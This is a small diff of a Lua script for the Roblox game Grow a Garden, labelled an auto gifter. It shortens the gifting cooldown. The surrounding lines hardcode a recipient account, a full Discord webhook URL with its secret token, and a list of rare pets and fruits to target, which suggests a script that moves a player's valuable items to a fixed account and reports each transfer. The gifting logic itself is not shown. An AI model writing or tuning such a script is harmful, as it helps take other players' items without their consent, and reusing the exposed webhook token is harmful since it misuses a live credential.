@@ -1,7 +1,7 @@
 -- Grow a Garden Auto Gifter with Discord Embed
 local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1383491297859469433/StCTYTDOXN9jcRg-qBV59aNlF9uEyuAg2_OnAcknekx6tTvFPdw83T2uP6cmivRYOYEs"
-local GIFT_COOLDOWN = 1
+local GIFT_COOLDOWN = 0.7
 local TARGET_ITEMS = {
     Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
     Fruits = {"candy blossom"}
